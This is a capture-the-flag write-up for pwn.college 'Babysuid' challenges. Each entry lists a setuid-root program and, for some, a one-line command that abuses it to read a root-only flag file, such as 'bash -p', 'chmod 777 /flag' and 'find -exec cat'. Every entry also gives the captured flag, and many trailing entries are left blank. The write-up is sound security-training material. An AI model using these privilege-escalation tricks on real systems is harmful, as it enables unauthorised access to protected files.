# Babysuid

These challenges work as following: 
1. We need to select a linux program that is owned by root. 
2. The program will be +s'ed (which means that its EUID will be 0).
3. Use that program to read the flag file (at the / directory) which only root user can.
4. The used programs cannot be repeated  

All challenges account for a total of 100 programs which will force us to use programs that were not designed to print files. <br>


## Programs

**NOTE 1:** For trivial programs, such as the ones that are specifically designed to print file contents, i'll only post the flag. <br>
**NOTE 2:** The flags are generated each time, so they wont work accross sessions <br>

### 1 - /bin/cat

```bash
# FLAG: pwn_college{4fBA3u9k_PFVx5-MK3oqJHImlHa.QXiQXYj9ibpJ2LiwSMsQjNxIzW}
```
### 2 - /bin/more 

```bash
# FLAG: pwn_college{49pT7FoqdEiPQo1Uj2NfX0uZxfy.0lIlJ3bt9ibpJ2LiwiMsQjNxIzW} 
```

### 3 - /bin/less 

```bash
# FLAG: pwn_college{4BZzWM6RdNnzF0IUx7bTJJMPB9P.0lIzNXZs9ibpJ2LiwyMsQjNxIzW} 
```

### 4 - /usr/bin/vim 

```bash
# FLAG: pwn_college{k-fOFu45ofDh9a3n2r828yhpvRi.0lIjl2chJmLtlmdv4Wai9iczV3LiwCNsQjNxIzW}
```

### 5 - /bin/nano

```bash
# FLAG: pwn_college{0pwvUy8bsK7GtBeAis59cuD2a3E.0lIv5WYu9ibpJ2LiwSNsQjNxIzW}
```

### 6 - /bin/bash

```bash
ctf$: bash -p (run bash as root)
root$: cat /flag.txt

# FLAG: pwn_college{UvZNuo3A5wjqSUyPDBmDgHCxyQ0.0lIoNXYi9ibpJ2LiwiNsQjNxIzW}
```

### 6 - /bin/chmod 

```bash
ctf$: chmod 777 /flag && cat /flag

# FLAG: pwn_college{41BgM-MeZ5FwpxAFHtfWv1mowZZ.dJCZv1Gaj9ibpJ2LiwyNsQjNxIzW}
```

### 8 - /bin/chwon 

```bash
ctf$: chown ctf:ctf /flag && cat /flag

# FLAG: pwn_college{gm0Iox5Op1ksxwO2PXlDVF-wzt5.dJib39Gaj9ibpJ2LiwCOsQjNxIzW}
```

### 9 - /usr/bin/find 

```bash
ctf$: find /flag -exec cat \{\} \;

# FLAG: pwn_college{ga5e-76C5u2aSUMdRtOobvcHfTJ.dJCZulmZv4Wai9iczV3LiwCOsQjNxIzW} 
```

### 10 - /bin/sed 

```bash
ctf$: sed -e "" /flag

# FLAG: pwn_college{09zM1TqiYXd_kbXY4X-J0zXWLpb.QXiQWZz9ibpJ2LiwSOsQjNxIzW}
```

### 11 - /usr/bin/awk

```bash
ctf$: awk 1 /flag

# FLAG: pwn_college{g4HVO3GbHgudbmVikjbXSRidaMq.QXis2dhd2LulmYvI3c19iIsATMsQjNxIzW} 
```

### 12 - /bin/grep

```bash
ctf$: grep "" /flag

# FLAG: pwn_college{QPhG5Uj3g2mokxdQ4ekfd44ra11.dJCclJ3Zv4Wai9iIsITMsQjNxIzW}
```

### 13 - /bin/zsh

```bash
Same as with bash

# FLAG: pwn_college{8aACb1q3dsSq1AUnPIAPvakqLS9.0lIoNnev4Wai9iIsMTMsQjNxIzW}
```

### 14 - /bin/dash 

```bash
Same as above

# FLAG: pwn_college{Qhb9M3kCnsXL4ZaQ4_zzGcwnvHS.dJCazFGZv4Wai9iIsQTMsQjNxIzW}
```

### 15 - /bin/lksh

```bash
Same as above

# FLAG: pwn_college{4Y2iN01SXHn-ZNrRbHdbRoYQh8H.dJCaztGbv4Wai9iIsUTMsQjNxIzW}
```

### 16 - /bin/mksh

```bash
Same as above

# FLAG: pwn_college{gZa5J11Jdz3M-WiRjbpZPhgKuxQ.dJCaztWbv4Wai9iIsYTMsQjNxIzW}
```

### 17 - /bin/sash 

```bash
Does not have "-p" flag.
ctf$: /bin/sash -c "cat /flag"

# FLAG: 
```

### 18 - /bin/whiptail

```bash
ctf$: /bin/whiptail --textbox /flag 10 50

# FLAG: pwn_college{sVTUuyhJ6Q0VDBRN6LvDplS77gd.QXiwWahRHcph2dv4Wai9iIsgTMsQjNxIzW}
```

### 19 - /usr/bin/tail 

```bash
# FLAG: pwn_college{4celqS8W2TxPL3YECz4gl1s0ubW.QXiwWahR3LulmYvI3c19iIskTMsQjNxIzW}
```

### 

```bash
# FLAG: 
```

### 

```bash
# FLAG: 
```

### 

```bash
# FLAG: 
```

### 

```bash
# FLAG: 
```

### 

```bash
# FLAG: 
```

### 

```bash
# FLAG: 
```

### 

```bash
# FLAG: 
```

### 

```bash
# FLAG: 
```

### 

```bash
# FLAG: 
```

### 

```bash
# FLAG: 
```

### 

```bash
# FLAG: 
```

### 

```bash
# FLAG: 
```

